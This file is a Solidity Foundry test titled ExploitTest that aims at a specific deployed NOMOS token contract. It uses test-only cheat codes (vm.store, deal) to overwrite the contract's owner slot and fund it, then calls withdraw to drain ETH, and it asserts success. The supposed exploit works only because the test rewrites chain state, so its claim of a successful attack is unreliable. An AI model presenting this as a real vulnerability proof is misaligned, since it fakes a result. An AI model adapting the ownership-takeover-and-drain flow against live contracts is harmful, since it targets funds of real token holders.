pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IUniswapV2Router02 {
}

interface NOMOS {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function withdraw() external;
    function uniswapV2Pair() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    NOMOS token;
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = NOMOS(TARGET);
        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // Inject ETH for gas
        deal(address(this), 10 ether);

        // Inject NOMOS tokens to attacker (1 billion tokens with 11 decimals)
        deal(address(token), address(this), 1_000_000_000 * 1e11);

        // Find owner slot and overwrite it - owner is at slot 0 in Ownable
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));

        // Verify we are now the owner
        assertEq(token.owner(), address(this));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Inject ETH into contract
        deal(TARGET, 1 ether);

        // Withdraw as owner
        NOMOS(TARGET).withdraw();

        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

